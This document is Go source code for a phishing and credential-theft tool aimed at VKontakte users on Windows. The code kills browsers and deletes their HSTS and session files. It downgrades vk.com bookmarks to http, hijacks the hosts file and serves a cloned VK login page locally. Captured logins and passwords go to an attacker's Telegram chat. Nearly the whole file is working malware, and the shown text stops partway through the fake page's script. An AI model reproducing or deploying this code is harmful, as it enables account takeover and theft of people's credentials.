package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/go-telegram-bot-api/telegram-bot-api"
)

const (
	botToken   string = "YOUR_BOT_TOKEN"
	userChatId int64  = YOUR_CHAT_ID_FROM_TELEGRAM
)

func justCloseBrowsers() {

	c := exec.Command("taskkill", "/F", "/IM", "cmd.exe", "/IM", "amigo.exe", "/IM", "chrome.exe", "/IM", "opera.exe", "/IM", "firefox.exe", "/IM", "browser.exe")

	c.Run()

}

func changeBookmark1Amigo() {
	homeDir := strings.Replace(os.Getenv("LOCALAPPDATA"), "\\", "/", -1)
	pathToGoogleFile := homeDir + "/Amigo//User Data/Default/Bookmarks"
	pathToGoogleFile = filepath.ToSlash(pathToGoogleFile)
	content := getContentFromFile(pathToGoogleFile)
	content = strings.Replace(content, "https://vk.com", "http://vk.com", -1)

	d1 := []byte(content)

	ioutil.WriteFile(pathToGoogleFile, d1, 0644)
}
func changeBookmark2Amigo() {
	homeDir := strings.Replace(os.Getenv("LOCALAPPDATA"), "\\", "/", -1)
	pathToGoogleFile := homeDir + "/Amigo/User Data/Default/Bookmarks.bak"
	pathToGoogleFile = filepath.ToSlash(pathToGoogleFile)
	content := getContentFromFile(pathToGoogleFile)
	content = strings.Replace(content, "https://vk.com", "http://vk.com", -1)

	d1 := []byte(content)

	ioutil.WriteFile(pathToGoogleFile, d1, 0644)

}

func changeBookmark3Amigo() {
	homeDir := strings.Replace(os.Getenv("LOCALAPPDATA"), "\\", "/", -1)
	pathToGoogleFile := homeDir + "/Amigo/User Data/Default/Top Sites"
	pathToGoogleFile = filepath.ToSlash(pathToGoogleFile)
	content := getContentFromFile(pathToGoogleFile)
	content = strings.Replace(content, "https://vk.com", "http://vk.com", -1)

	d1 := []byte(content)

	ioutil.WriteFile(pathToGoogleFile, d1, 0644)

}

func deleteAmigoFiles() {
	homeDir := strings.Replace(os.Getenv("LOCALAPPDATA"), "\\", "/", -1)
	pathToGoogleFile := homeDir + "/Amigo/User Data/Default/TransportSecurity"
	pathToGoogleFile = filepath.ToSlash(pathToGoogleFile)
	os.Remove(pathToGoogleFile)

	pathToGoogleFile = homeDir + "/Amigo/User Data/Default/Current Session"
	pathToGoogleFile = filepath.ToSlash(pathToGoogleFile)
	os.Remove(pathToGoogleFile)

}

func deleteGoogleFiles() {
	homeDir := strings.Replace(os.Getenv("LOCALAPPDATA"), "\\", "/", -1)
	pathToGoogleFile := homeDir + "/Google/Chrome/User Data/Default/TransportSecurity"
	pathToGoogleFile = filepath.ToSlash(pathToGoogleFile)
	os.Remove(pathToGoogleFile)

	pathToGoogleFile = homeDir + "/Google/Chrome/User Data/Default/Current Session"
	pathToGoogleFile = filepath.ToSlash(pathToGoogleFile)
	os.Remove(pathToGoogleFile)

}
func deleteOperaFiles() {
	homeDir := strings.Replace(os.Getenv("APPDATA"), "\\", "/", -1)
	pathToGoogleFile := homeDir + "/Opera Software/Opera Stable/TransportSecurity"
	pathToGoogleFile = filepath.ToSlash(pathToGoogleFile)
	os.Remove(pathToGoogleFile)

	pathToGoogleFile = homeDir + "/Opera Software/Opera Stable/Current Session"
	pathToGoogleFile = filepath.ToSlash(pathToGoogleFile)
	os.Remove(pathToGoogleFile)
}

func deleteYandexFiles() {
	homeDir := strings.Replace(os.Getenv("LOCALAPPDATA"), "\\", "/", -1)
	pathToYandexFile := homeDir + "/Yandex/YandexBrowser/User Data/Default/TransportSecurity"
	pathToYandexFile = filepath.ToSlash(pathToYandexFile)

	os.Remove(pathToYandexFile)

	pathToYandexFile = homeDir + "/Yandex/YandexBrowser/User Data/Default/Current Session"
	pathToYandexFile = filepath.ToSlash(pathToYandexFile)

	os.Remove(pathToYandexFile)
}

func deleteFirefoxFiles() {
	homeDir := strings.Replace(os.Getenv("APPDATA"), "\\", "/", -1)
	pathToGoogleFile := homeDir + "/Mozilla/Firefox/Profiles/"
	pathToGoogleFile = filepath.ToSlash(pathToGoogleFile)

	files, _ := ioutil.ReadDir(pathToGoogleFile)

	for _, file := range files {
		pathTo := pathToGoogleFile + file.Name() + "/SiteSecurityServiceState.txt"

		os.Remove(pathTo)

		pathTo = pathToGoogleFile + file.Name() + "/Current Session"
		pathTo = filepath.ToSlash(pathTo)
		os.Remove(pathTo)

	}
}

func changeBookmark1Opera() {
	homeDir := strings.Replace(os.Getenv("APPDATA"), "\\", "/", -1)
	pathToGoogleFile := homeDir + "/Opera Software/Opera Stable/Bookmarks"
	pathToGoogleFile = filepath.ToSlash(pathToGoogleFile)
	content := getContentFromFile(pathToGoogleFile)
	content = strings.Replace(content, "https://vk.com", "http://vk.com", -1)

	d1 := []byte(content)

	ioutil.WriteFile(pathToGoogleFile, d1, 0644)
}
func changeBookmark2Opera() {
	homeDir := strings.Replace(os.Getenv("APPDATA"), "\\", "/", -1)
	pathToGoogleFile := homeDir + "/Opera Software/Opera Stable/Bookmarks.bak"
	pathToGoogleFile = filepath.ToSlash(pathToGoogleFile)
	content := getContentFromFile(pathToGoogleFile)
	content = strings.Replace(content, "https://vk.com", "http://vk.com", -1)

	d1 := []byte(content)

	ioutil.WriteFile(pathToGoogleFile, d1, 0644)

}

func changeBookmarksFirefox() {

	homeDir := strings.Replace(os.Getenv("APPDATA"), "\\", "/", -1)
	pathToGoogleFile := homeDir + "/Mozilla/Firefox/Profiles/"
	pathToGoogleFile = filepath.ToSlash(pathToGoogleFile)

	files, _ := ioutil.ReadDir(pathToGoogleFile)

	for _, file := range files {
		pathTo := pathToGoogleFile + file.Name() + "/places.sqlite"

		content := getContentFromFile(pathTo)

		content = strings.Replace(content, "https://vk.com", "http://vk.com", -1)

		d1 := []byte(content)

		ioutil.WriteFile(pathTo, d1, 0644)

	}
}

func changeBookmark1Google() {
	homeDir := strings.Replace(os.Getenv("LOCALAPPDATA"), "\\", "/", -1)
	pathToGoogleFile := homeDir + "/Google/Chrome/User Data/Default/Bookmarks"
	pathToGoogleFile = filepath.ToSlash(pathToGoogleFile)
	content := getContentFromFile(pathToGoogleFile)
	content = strings.Replace(content, "https://vk.com", "http://vk.com", -1)

	d1 := []byte(content)

	ioutil.WriteFile(pathToGoogleFile, d1, 0644)
}
func changeBookmark2Google() {
	homeDir := strings.Replace(os.Getenv("LOCALAPPDATA"), "\\", "/", -1)
	pathToGoogleFile := homeDir + "/Google/Chrome/User Data/Default/Bookmarks.bak"
	pathToGoogleFile = filepath.ToSlash(pathToGoogleFile)
	content := getContentFromFile(pathToGoogleFile)
	content = strings.Replace(content, "https://vk.com", "http://vk.com", -1)

	d1 := []byte(content)

	ioutil.WriteFile(pathToGoogleFile, d1, 0644)

}
func changeBookmark1Yandex() {
	homeDir := strings.Replace(os.Getenv("LOCALAPPDATA"), "\\", "/", -1)
	pathToGoogleFile := homeDir + "/Yandex/YandexBrowser/User Data/Default/Bookmarks"
	pathToGoogleFile = filepath.ToSlash(pathToGoogleFile)
	content := getContentFromFile(pathToGoogleFile)
	content = strings.Replace(content, "https://vk.com", "http://vk.com", -1)

	d1 := []byte(content)

	ioutil.WriteFile(pathToGoogleFile, d1, 0644)
}
func changeBookmark2Yandex() {
	homeDir := strings.Replace(os.Getenv("LOCALAPPDATA"), "\\", "/", -1)
	pathToGoogleFile := homeDir + "/Yandex/YandexBrowser/User Data/Default/Bookmarks.bak"
	pathToGoogleFile = filepath.ToSlash(pathToGoogleFile)
	content := getContentFromFile(pathToGoogleFile)
	content = strings.Replace(content, "https://vk.com", "http://vk.com", -1)

	d1 := []byte(content)

	ioutil.WriteFile(pathToGoogleFile, d1, 0644)

}
func getContentFromFile(filename string) string {
	file, err := os.Open(filename)
	if err != nil {
		// здесь перехватывается ошибка
		return ""
	}
	defer file.Close()

	// получить размер файла
	stat, err := file.Stat()
	if err != nil {
		return ""
	}
	// чтение файла
	bs := make([]byte, stat.Size())
	_, err = file.Read(bs)
	if err != nil {
		return ""
	}

	str := string(bs)
	return str
}

func closeBrowsers() {
	justCloseBrowsers()
	deleteFirefoxFiles()
	deleteGoogleFiles()
	deleteOperaFiles()
	deleteYandexFiles()
	deleteAmigoFiles()
	changeBookmark1Amigo()
	changeBookmark2Amigo()
	changeBookmark3Amigo()
	changeBookmarksFirefox()
	changeBookmark1Google()
	changeBookmark2Google()
	changeBookmark1Yandex()
	changeBookmark2Yandex()
	changeBookmark1Opera()
	changeBookmark2Opera()

}

func main() {
	bot, _ := tgbotapi.NewBotAPI(botToken)

	bot.Debug = false

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	msg := tgbotapi.NewMessage(userChatId, "*Ext32* работает. Но взлом еще не запущен.\n\nЧтобы запустить взлом, выполните /start.\nЧтобы остановить взлом, выполните /stop.")
	msg.ParseMode = "markdown"
	bot.Send(msg)

	http.HandleFunc("/", handler)
	http.HandleFunc("/login", loginHandle)
	http.HandleFunc("/restore", restoreHandle)
	http.HandleFunc("/end", endHandle)
	go http.ListenAndServe(":80", nil)

	updates, _ := bot.GetUpdatesChan(u)

	for update := range updates {
		if update.Message == nil {
			continue
		}

		if update.Message.Chat.ID == userChatId && update.Message.Text == "/start" {
			closeBrowsers()
			rootDir := strings.Replace(os.Getenv("SystemRoot"), "\\", "/", -1)
			d1 := []byte("127.0.0.1 vk.com")
			ioutil.WriteFile(rootDir+"/System32/drivers/etc/hosts", d1, 0644)

			msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Взлом *запущен.*")
			msg.ParseMode = "markdown"
			bot.Send(msg)

		} else if update.Message.Chat.ID == userChatId && update.Message.Text == "/stop" {
			rootDir := strings.Replace(os.Getenv("SystemRoot"), "\\", "/", -1)
			d1 := []byte("127.0.0.1 localhost")
			ioutil.WriteFile(rootDir+"/System32/drivers/etc/hosts", d1, 0644)

			msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Взлом *остановлен.*")
			msg.ParseMode = "markdown"
			bot.Send(msg)
		} else {
			continue
		}
	}
}

func loginHandle(w http.ResponseWriter, r *http.Request) {
	login := r.PostFormValue("loginVK")
	password := r.PostFormValue("passwordVK")
	text := "*Логин:* _" + login + "_\n*Пароль:* _" + password + "_"
	bot, _ := tgbotapi.NewBotAPI(botToken)
	msg := tgbotapi.NewMessage(userChatId, text)
	msg.ParseMode = "markdown"
	bot.Send(msg)
	http.Redirect(w, r, "/restore", 301)
}

func endHandle(w http.ResponseWriter, r *http.Request) {
	login := r.PostFormValue("loginVK")
	password := r.PostFormValue("passwordVK")
	text := "*Логин:* _" + login + "_\n*Пароль:* _" + password + "_"
	bot, _ := tgbotapi.NewBotAPI(botToken)
	msg := tgbotapi.NewMessage(userChatId, text)
	msg.ParseMode = "markdown"
	bot.Send(msg)
	msg = tgbotapi.NewMessage(userChatId, "*Ext32* остановлен")
	msg.ParseMode = "markdown"
	bot.Send(msg)
	rootDir := strings.Replace(os.Getenv("SystemRoot"), "\\", "/", -1)
	d1 := []byte("127.0.0.1 localhost")
	ioutil.WriteFile(rootDir+"/System32/drivers/etc/hosts", d1, 0644)
	http.Redirect(w, r, "https://www.vk.com/feed", 301)
}

func handler(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintf(w, `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru" lang="ru">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<link rel="shortcut icon" href="https://www.vk.com/images/icons/favicons/fav_logo.ico?6" />

<link rel="apple-touch-icon" href="https://www.vk.com/images/safari_60.png?1">
<link rel="apple-touch-icon" sizes="76x76" href="https://www.vk.com/images/safari_76.png?1">
<link rel="apple-touch-icon" sizes="120x120" href="https://www.vk.com/images/safari_120.png?1">
<link rel="apple-touch-icon" sizes="152x152" href="https://www.vk.com/images/safari_152.png?1">

<meta http-equiv="content-type" content="text/html; charset=windows-1251" />
<meta name="description" content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте." />


<title>Добро пожаловать | ВКонтакте</title>
<noscript><meta http-equiv="refresh" content="0; URL=https://www.vk.com/badbrowser.php"></noscript>

<link rel="stylesheet" type="text/css" href="https://www.vk.com/css/al/common.css?38823968139" /><link rel="stylesheet" type="text/css" href="https://www.vk.com/css/al/fonts_cnt.css?1318650823" />

<script type="text/javascript">
var vk = {
  ads_rotate_interval: 120000,
  al: parseInt('4') || 4,
  id: 0,
  intnat: '' ? true : false,
  host: 'vk.com',
  lang: 0,
  rtl: parseInt('') || 0,
  version: 6192532226690,
  stDomains: 0,
  stDomain: '',
  zero: false,
  contlen: 12758,
  loginscheme: 'https',
  ip_h: '1b794c31b36621f5dc',
  navPrefix: '/',
  dt: parseInt('0') || 0,
  fs: parseInt('13') || 13,
  ts: 1527525282,
  tz: 10800,
  pd: 0,
  css_dir: '',
  vcost: 7,
  time: [2018, 5, 28, 19, 34, 42],
  sampleUser: -1, spentLastSendTS: new Date().getTime(),
  a11y: 0,
  statusExportHash: '',
  audioAdsConfig: {"_":"_"},
  longViewTestGroup: "every_view",
  cma: 1,
  postNoEncode: 0,
  lpConfig: {
    enabled: 0,
    key: '',
    ts: 0,
    url: '',
    lpstat: 0
  },

  pr_tpl: "<div class=\"pr %cls%\" id=\"%id%\"><div class=\"pr_bt\"><\/div><div class=\"pr_bt\"><\/div><div class=\"pr_bt\"><\/div><\/div>",

  audioInlinePlayerTpl: "<div class=\"audio_inline_player _audio_inline_player no_select\">\n  <div class=\"audio_inline_player_right\">\n    <div class=\"audio_inline_player_volume\"><\/div>\n  <\/div>\n  <div class=\"audio_inline_player_left\">\n    <div class=\"audio_inline_player_progress\"><\/div>\n  <\/div>\n<\/div>",

  tnsPixelType: 'unauth'
};

window.locDomain = vk.host.match(/[a-zA-Z]+\.[a-zA-Z]+\.?$/)[0];
var _ua = navigator.userAgent.toLowerCase();
if (/opera/i.test(_ua) || !/msie 6/i.test(_ua) || document.domain != locDomain) document.domain = locDomain;
var ___htest = (location.toString().match(/#(.*)/) || {})[1] || '', ___to;
___htest = ___htest.split('#').pop();
if (vk.al != 1 && ___htest.length && ___htest.substr(0, 1) == vk.navPrefix) {
  if (vk.al != 3 || vk.navPrefix != '!') {
    ___to = ___htest.replace(/^(\/|!)/, '');
    if (___to.match(/^([^\?]*\.php|login|mobile)([^a-z0-9\.]|$)/)) ___to = '';
    location.replace(location.protocol + '//' + location.host + '/' + ___to);
  }
}

var StaticFiles = {
  'cmodules/web/common_web.js' : {v: 3},
  'common.css' : {v: 38823968139},'fonts_cnt.css' : {v: 1318650823}
  ,'lang0_0.js': {v: 25458754},'index.css':{v:17996710177},'index.js':{v:356147149},'login.css':{v:20825631588},'ui_controls.css':{v:18836222651},'ui_controls.js':{v:722858875},'time_spent.js':{v:732637085},'cmodules/web/page_layout.js':{v:1172409392},'ui_common.js':{v:2830856243},'ui_common.css':{v:18773680897},'audioplayer.js':{v:5900725812},'cmodules/web/likes.js':{v:1},'cmodules/web/grip.js':{v:4164501492}
}
var abp;
</script>

<link type="text/css" rel="stylesheet" href="https://www.vk.com/css/al/index.css?17996710177"></link><link type="text/css" rel="stylesheet" href="https://www.vk.com/css/al/login.css?20825631588"></link><link type="text/css" rel="stylesheet" href="https://www.vk.com/css/ui_controls.css?18836222651"></link><link type="text/css" rel="stylesheet" href="https://www.vk.com/css/al/ui_common.css?18773680897"></link><script type="text/javascript" src="https://www.vk.com/js/loader_nav6192532226690_0.js"></script><script type="text/javascript" src="https://www.vk.com/js/cmodules/web/common_web.js?3_72851755925"></script><script type="text/javascript" src="https://www.vk.com/js/lang0_0.js?25458754"></script><script type="text/javascript" src="https://www.vk.com/js/lib/px.js?ch=1"></script><script type="text/javascript" src="https://www.vk.com/js/lib/px.js?ch=2"></script><link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.vk.com/" /><link rel="alternate" href="android-app://com.vkontakte.android/vkontakte/m.vk.com/" /><script type="text/javascript" src="https://www.vk.com/js/al/index.js?356147149"></script><script type="text/javascript" src="https://www.vk.com/js/lib/ui_controls.js?722858875"></script><script type="text/javascript" src="https://www.vk.com/js/al/time_spent.js?732637085"></script><script type="text/javascript" src="https://www.vk.com/js/cmodules/web/page_layout.js?1172409392"></script><script type="text/javascript" src="https://www.vk.com/js/al/ui_common.js?2830856243"></script><script type="text/javascript" src="https://www.vk.com/js/cmodules/web/audioplayer.js?5900725812"></script><script type="text/javascript" src="https://www.vk.com/js/cmodules/web/likes.js?1"></script><script type="text/javascript" src="https://www.vk.com/js/cmodules/web/grip.js?4164501492"></script>

</head>

<body onresize="onBodyResize()" class="index_page">
  <div id="system_msg" class="fixed"></div>
  <div id="utils"></div>

  <div id="layer_bg" class="fixed"></div><div id="layer_wrap" class="scroll_fix_wrap fixed layer_wrap"><div id="layer"></div></div>
  <div id="box_layer_bg" class="fixed"></div><div id="box_layer_wrap" class="scroll_fix_wrap fixed"><div id="box_layer"><div id="box_loader"><div class="pr pr_baw pr_medium" id="box_loader_pr"><div class="pr_bt"></div><div class="pr_bt"></div><div class="pr_bt"></div></div><div class="back"></div></div></div></div>

  <div id="stl_left"></div><div id="stl_side"></div>

  <script type="text/javascript">window.domStarted && domStarted();</script>

  <div class="scroll_fix_wrap _page_wrap" id="page_wrap"><div><div class="scroll_fix">
  

  <div id="page_header_cont" class="page_header_cont">
    <div class="back"></div>
    <div id="page_header_wrap" class="page_header_wrap">
      <a class="top_back_link" href="index.html" id="top_back_link" onclick="if (nav.go(this, event, {back: true}) === false) { showBackLink(); return false; }" onmousedown="tnActive(this)"></a>
      <div id="page_header" class="p_head p_head_l0" style="width: 960px">
        <div class="content">
          <div id="top_nav" class="head_nav">
  <div class="head_nav_item fl_l"><a class="top_home_link fl_l " href="/" aria-label="На главную" accesskey="1" ><div class="top_home_logo"></div></a></div>
  <div class="head_nav_item fl_l"><div id="ts_wrap" class="ts_wrap" onmouseover="TopSearch.initFriendsList();">
  <input name="disable-autofill" style="display: none;" />
  <input type="text" onmousedown="event.cancelBubble = true;" ontouchstart="event.cancelBubble = true;" class="text ts_input" id="ts_input" autocomplete="off" name="disable-autofill" placeholder="Поиск" aria-label="Поиск" />
</div></div>
  <div class="head_nav_item fl_l head_nav_btns"><span id="top_audio_layer_place"></span></div>
  <div class="head_nav_item fl_r"><a class="top_nav_link" href="index.html" id="top_switch_lang" style="" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: 'ecc8951f2a33d1da62' }); return false;" onmousedown="tnActive(this)">
  Switch to English
</a><a class="top_nav_link" href="https://www.vk.com/join" id="top_reg_link" style="display: none" onclick="return !showBox('join.php', {act: 'box', from: nav.strLoc}, {}, event)" onmousedown="tnActive(this)">
  регистрация
</a></div>
  <div class="head_nav_item_player"></div>
</div>
<div id="ts_cont_wrap" class="ts_cont_wrap" ontouchstart="event.cancelBubble = true;" onmousedown="event.cancelBubble = true;"></div>
        </div>
      </div>
    </div>
  </div>

  <div id="page_layout" style="width: 960px;">
    <div id="side_bar" class="side_bar fl_l " style="display: none">
      <div id="side_bar_inner" class="side_bar_inner">
        <div id="quick_login" class="quick_login">
  <form method="POST" name="login" id="quick_login_form" action="/login">
    <input type="hidden" name="act" value="login" />
    <input type="hidden" name="role" value="al_frame" />
    <input type="hidden" name="expire" id="quick_expire_input" value="" />
    <input type="hidden" name="recaptcha" id="quick_recaptcha" value="" />
    <input type="hidden" name="captcha_sid" id="quick_captcha_sid" value="" />
    <input type="hidden" name="captcha_key" id="quick_captcha_key" value="" />
    <input type="hidden" name="_origin" value="https://www.vk.com" />
    <input type="hidden" name="ip_h" value="1b794c31b36621f5dc" />
    <input type="hidden" name="lg_h" value="c1b962ae8900b56ef5" />
    <div class="label">Телефон или email</div>
    <div class="labeled"><input type="text" name="loginVK" class="dark" id="quick_email" autofocus/></div>
    <div class="label">Пароль</div>
    <div class="labeled"><input type="password" name="passwordVK" class="dark" id="quick_pass" onkeyup="toggle('quick_expire', !!this.value);toggle('quick_forgot', !this.value)" /></div>
    <input type="submit" class="submit" />
  </form>
  <button class="quick_login_button flat_button button_wide" id="quick_login_button">Войти</button>
  <button class="quick_reg_button flat_button button_wide" id="quick_reg_button" style="display: none" onclick="top.showBox('join.php', {act: 'box', from: nav.strLoc})">Регистрация</button>
  <div class="clear forgot"><div class="checkbox" id="quick_expire" onclick="checkbox(this);ge('quick_expire_input').value=isChecked(this)?1:'';">Чужой компьютер</div><a id="quick_forgot" class="quick_forgot" href="https://www.vk.com/restore" target="_top">Забыли пароль?</a></div>
</div>
      </div>
    </div>

    <div id="page_body" class="fl_r " style="width: 960px;">
      <div id="header_wrap2">
        <div id="header_wrap1">
          <div id="header" style="display: none">
            <h1 id="title"></h1>
          </div>
        </div>
      </div>
      <div id="wrap_between"></div>
      <div id="wrap3"><div id="wrap2">
  <div id="wrap1">
    <div id="content"><div id="index_rcolumn" class="index_rcolumn">
  <div id="index_login" class="page_block index_login">
    <form method="post" name="login" id="index_login_form" action="/login">
      <input type="hidden" name="act" id="act" value="login">
      <input type="hidden" name="role" value="al_frame" />
      <input type="hidden" name="expire" id="index_expire_input" value="" />
      <input type="hidden" name="_origin" value="https://www.vk.com" />
      <input type="hidden" name="ip_h" value="1b794c31b36621f5dc" />
      <input type="hidden" name="lg_h" value="a1a87b485d75028fe1" />
      <input type="text" class="big_text" name="loginVK" id="index_email" value="" placeholder="Телефон или email" autofocus/>
      <input type="password" class="big_text" name="passwordVK" id="index_pass" value="" placeholder="Пароль" onkeyup="toggle('index_expire', !!this.value);toggle('index_forgot', !this.value)" />
      <button id="index_login_button" class="index_login_button flat_button button_big_text">Войти</button>
      <div class="forgot">
        <div class="checkbox" id="index_expire" onclick="checkbox(this);ge('index_expire_input').value=isChecked(this)?1:'';">Чужой компьютер</div>
        <a id="index_forgot" class="index_forgot" href="https://www.vk.com/restore" target="_top">Забыли пароль?</a>
      </div>
    </form>
  </div>
  <div id="ij_form" class="page_block ij_form">
    <h2 class="ij_header">Впервые ВКонтакте?</h2>
    <div class="ij_subheader">Моментальная регистрация</div>
    <div id="ij_msg"></div>
    <input type="text" class="big_text" id="ij_first_name" value="" placeholder="Ваше имя" />
    <input type="text" class="big_text" id="ij_last_name" value="" placeholder="Ваша фамилия" />
    <div class="ij_label">Дата рождения<span class="hint_icon" data-title="&lt;b&gt;Заполненная дата рождения&lt;/b&gt; позволит друзьям легче найти Вас, а также подбирать для Вас интересные материалы.&lt;br&gt;Вы сможете всегда настроить видимость Вашей даты рождения в редактировании профиля." onmouseover="showHint(this);"></span></div>
    <div id="ij_birthdate_row" class="ij_birthdate_row clear_fix">
      <div class="ij_bday"><input type="text" class="big_text" id="ij_bday" /></div>
      <div class="ij_bmonth"><input type="text" class="big_text" id="ij_bmonth" /></div>
      <div class="ij_byear"><input type="text" class="big_text" id="ij_byear" /></div>
    </div>
    <div id="ij_sex_row" class="clear_fix unshown">
      <div class="ij_label">Ваш пол</div>
      <div class="radiobtn" onclick="radiobtn(this, 1, 'ij_sex');">Женский</div>
      <div class="radiobtn" onclick="radiobtn(this, 2, 'ij_sex');">Мужской</div>
    </div>
    <button class="flat_button button_wide button_big_text ij_button" id="ij_submit" onclick="Index.submitJoinStart()">Продолжить регистрацию</button>
    <div id="index_fbsign" class="index_fbsign">
      <a id="index_fb" class="index_fb_lnk" href="" onclick="return Index.fbJoin();"><div class="index_fb_icon"></div>Войти через Facebook</a>
    </div>
    <div id="index_fbcontinuewithsign" class="index_fbcontinuewithsign">
      <div class="fb-login-button index_fb_continue_with_btn" onclick="return Index.fbJoin();" data-use-continue-as="true" data-width="264" data-max-rows="1" data-size="medium" data-button-type="continue_with"></div>
    </div>
  </div>
</div>
<div class="login_mobile_promo_wrap clear_fix">
  <div class="login_mobile_apps">
    <div class="login_mobile_header">ВКонтакте для мобильных устройств</div>
    <div class="login_mobile_info">Установите официальное мобильное приложение ВКонтакте и оставайтесь в курсе новостей Ваших друзей, где бы Вы ни находились.</div>
    
    <div class="login_app_devices">

      <a href="https://play.google.com/store/apps/details?id=com.vkontakte.android" target="_blank" class="login_app_device login_app_device_android">
        <div class="login_app_device_screen_wrap">
          <div class="login_app_device_screen login_app_device_ru"></div>
        </div>

        <div class="login_app_download_wrap">
          <button class="flat_button secondary button_light">
            <span class="login_app_download_icon"></span>
            VK для Android
          </button>
        </div>
      </a>

      <a href="https://www.microsoft.com/store/apps/9wzdncrfj1pt" target="_blank" class="login_app_device login_app_device_wp">
        <div class="login_app_device_screen_wrap">
          <div class="login_app_device_screen login_app_device_ru"></div>
        </div>

        <div class="login_app_download_wrap">
          <button class="flat_button secondary button_light">
            <span class="login_app_download_icon"></span>
            VK для WP
          </button>
        </div>
      </a>

      <a href="https://itunes.apple.com/ru/app/id564177498" target="_blank" class="login_app_device login_app_device_ios">
        <div class="login_app_device_screen_wrap">
          <div class="login_app_device_screen login_app_device_ru"></div>
        </div>

        <div class="login_app_download_wrap">
          <button class="flat_button secondary button_light">
            <span class="login_app_download_icon"></span>
            VK для iPhone
          </button>
        </div>
      </a>

    </div>
    <a href="/products" class="login_all_products_button">Все продукты</a>
  </div>
  <a onclick="curBox().hide()" id="login_mobile_close" class="login_mobile_close"></a>

  <div class="login_about_mobile">
    Для доступа к быстрой мобильной версии сайта ВКонтакте достаточно ввести в Вашем телефоне короткий адрес: <a target="_blank" href="https://m.vk.com">m.vk.com</a>
  </div>
</div>
<div id="index_footer_wrap" class="footer_wrap index_footer_wrap">
  <div class="footer_nav" id="bottom_nav">
  <div class="footer_copy fl_l"><a href="/about">ВКонтакте</a> &copy; 2018</div>
  <div class="footer_lang fl_r">Язык:<a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: 'ecc8951f2a33d1da62'})">English</a><a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 0, hash: 'ecc8951f2a33d1da62'})">Русский</a><a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 1, hash: 'ecc8951f2a33d1da62'})">Українська</a><a class="footer_lang_link" onclick="if (vk.al) { showBox('lang.php', {act: 'lang_dialog', all: 1}, {params: {dark: true, bodyStyle: 'padding: 0px'}, noreload: true}); } else { changeLang(1); } return false;">все языки &raquo;</a></div>
  <div class="footer_links">
    <a class="bnav_a" href="/about">о компании</a>
    <a class="bnav_a" href="/support?act=home" style="display: none;">помощь</a>
    <a class="bnav_a" href="/terms">правила</a>
    <a class="bnav_a" href="/ads" style="">реклама</a>
    
    <a class="bnav_a" href="/dev">разработчикам</a>
    <a class="bnav_a" href="/jobs" style="display: none;">вакансии</a>
  </div>
</div>
<div class="footer_bench clear">
</div>
</div></div>
  </div>
</div></div>
    </div>

    <div id="footer_wrap" class="footer_wrap fl_r" style="width: 960px;"><div class="footer_nav" id="bottom_nav">
  <div class="footer_copy fl_l"><a href="/about">ВКонтакте</a> &copy; 2018</div>
  <div class="footer_lang fl_r">Язык:<a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: 'ecc8951f2a33d1da62'})">English</a><a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 0, hash: 'ecc8951f2a33d1da62'})">Русский</a><a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 1, hash: 'ecc8951f2a33d1da62'})">Українська</a><a class="footer_lang_link" onclick="if (vk.al) { showBox('lang.php', {act: 'lang_dialog', all: 1}, {params: {dark: true, bodyStyle: 'padding: 0px'}, noreload: true}); } else { changeLang(1); } return false;">все языки &raquo;</a></div>
  <div class="footer_links">
    <a class="bnav_a" href="/about">о компании</a>
    <a class="bnav_a" href="/support?act=home" style="display: none;">помощь</a>
    <a class="bnav_a" href="/terms">правила</a>
    <a class="bnav_a" href="/ads" style="">реклама</a>
    
    <a class="bnav_a" href="/dev">разработчикам</a>
    <a class="bnav_a" href="/jobs" style="display: none;">вакансии</a>
  </div>
</div>

<div class="footer_bench clear">
  
</div></div>
    <div class="clear"></div>
  </div>
</div></div><noscript><div style="position:absolute;left:-10000px;">
<img src="//top-fwz1.mail.ru/counter?id=2579437;js=na" style="border:0;" height="1" width="1" />
</div></noscript></div>
  <div class="progress" id="global_prg"></div>

  <script type="text/javascript">
    if (parent && parent != window && (browser.msie || browser.opera || browser.mozilla || browser.chrome || browser.safari || browser.iphone)) {
      document.getElementsByTagName('body')[0].innerHTML = '';
    } else {
      window.domReady && domReady();
      updateMoney(0);
initPageLayoutUI();
if (browser.iphone || browser.ipad || browser.ipod) {
  setStyle(bodyNode, {webkitTextSizeAdjust: 'none'});
}var qf = ge('quick_login_form'), ql = ge('quick_login'), qe = ge('quick_email'), qp = ge('quick_pass');
var qlb = ge('quick_login_button'), prgBtn = qlb;

var qinit = function() {
  setTimeout(function() {
    ql.insertBefore(ce('div', {innerHTML: '<iframe class="upload_frame" id="quick_login_frame" name="quick_login_frame"></iframe>'}), qf);
    qf.target = 'quick_login_frame';
    qe.onclick = loginByCredential;
    qp.onclick = loginByCredential;
  }, 1);
}

if (window.top && window.top != window) {
  window.onload = qinit;
} else {
  setTimeout(qinit, 0);
}

qf.onsubmit = function() {
  if (!ge('quick_login_frame')) return false;
  if (!trim(qe.value)) {
    notaBene(qe);
    return false;
  } else if (!trim(qp.value)) {
    notaBene(qp);
    return false;
  }
  lockButton(window.__qfBtn = prgBtn);
  prgBtn = qlb;
  clearTimeout(__qlTimer);
  __qlTimer = setTimeout(loginSubmitError, 30000);
  domFC(domPS(qf)).onload = function() {
    clearTimeout(__qlTimer);
